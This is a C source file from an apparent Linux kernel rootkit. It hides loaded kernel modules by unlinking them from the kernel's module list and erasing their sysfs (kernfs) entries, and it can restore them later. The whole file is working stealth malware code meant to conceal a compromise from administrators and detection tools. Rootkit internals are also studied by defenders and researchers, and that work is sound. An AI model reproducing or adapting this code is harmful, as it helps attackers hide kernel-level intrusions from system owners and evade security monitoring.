#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/rbtree.h>
#include <linux/hash.h>

#include "control.h"
#include "include.h"
#include "main.h"
#include "sysmap.h"

#define member rb

LIST_HEAD(hidden_modules);

typedef struct module * func(char *name);
func* find_module1 = (func*) sysmap_find_module;

struct mutex *mod_mutex = (struct mutex *) (sysmap_module_mutex);
struct list_head *modules = (struct list_head *) sysmap_modules;

struct module* find_hidden_module(char* name)
{
  struct module* mod;

  list_for_each_entry(mod, &hidden_modules, list) {
   if (strcmp(mod->name, name) == 0) {
    return mod;
   }
  }
  return NULL;
}

static void kernfs_remove_node(struct kernfs_node *kn)
{
        /* rb_erase: Function defined in <rbtree.h>, Unlinks kernfs_node from sibling tree 
         * Line 272@Linux/fs/kernfs/dir.c  
         */
        rb_erase(&kn->rb, &kn->parent->dir.children);
        RB_CLEAR_NODE(&kn->rb);
}

int name_compare(unsigned int hash, const char *name, const void *ns, const struct kernfs_node *kn)
{
        if(hash != kn->hash)
                return hash - kn->hash;
        if(ns != kn->ns)
                return ns - kn->ns;
        return strcmp(name,kn->name);

}

int kernfs_insert_node(struct kernfs_node *kn)
{
      struct rb_node **node = &kn->parent->dir.children.rb_node;
      struct rb_node *parent = NULL;

      //printk("yaay! inside insert \n");

      while(*node)
      {
                struct kernfs_node *pos;
                int result;
                /* Get the kernfs_node from rb, rb_to_kn() */
                pos = rb_entry(*node, struct kernfs_node, member);
                parent = *node;
                /*compare the names to get the position to insert in rb tree*/
                result = name_compare(kn->hash, kn->name, kn->ns, pos);
                //result = kernfs_sd_comapre(kn,pos);

                if(result < 0)
                        node = &pos->rb.rb_left;
                else if(result > 0)
                        node = &pos->rb.rb_right;
                else
                {
                        return -EEXIST;
                }
        }

        /* Add new node and reblance the tree*/
        rb_link_node(&kn->rb,parent,node);
        rb_insert_color(&kn->rb, &kn->parent->dir.children);
 	
	/* Successfully added, account subdir number */
        if (kernfs_type(kn) == KERNFS_DIR)
                 kn->parent->dir.subdirs++;
        return 0;
}

void  hide_module_bymod(struct module *mod)
{
	
	ROOTKIT_DEBUG("Deleting module: %s\n", mod->name);
	list_del(&mod->list);
	kernfs_remove_node(mod->mkobj.kobj.sd);
	list_add_tail(&mod->list, &hidden_modules);
}

void  unhide_module_bymod(struct module *mod)
{

	ROOTKIT_DEBUG("Inserting module: %s\n", mod->name);
        
	/* Delete from the modules list */
	list_del(&mod->list);
	list_add(&mod->list,modules);
	kernfs_insert_node(mod->mkobj.kobj.sd);
}

void hide_module_byname(char *name)
{
        struct module *mod;

        mutex_lock(mod_mutex);
        mod = find_module1(name);
        mutex_unlock(mod_mutex);

        if(mod)
	{
          	hide_module_bymod(mod);
	}
	else
	{
		ROOTKIT_DEBUG("Module not found %s\n", name);	
	}

}

void unhide_module_byname(char *name)
{

        struct module *mod;
	mod = find_hidden_module(name);
	
	if(mod)
	{
                unhide_module_bymod(mod);
	}
	else
	{
		ROOTKIT_DEBUG("Module not found %s\n", name);	
	}

}

/* Called when unloading the rootkit, to make sure no module is hidden*/
void unhook_modules(void)
{
	while(hidden_modules.next != &hidden_modules)
        {
          struct module* mod = container_of(hidden_modules.next, struct module, list);
          unhide_module_bymod(mod);
        }
	
}
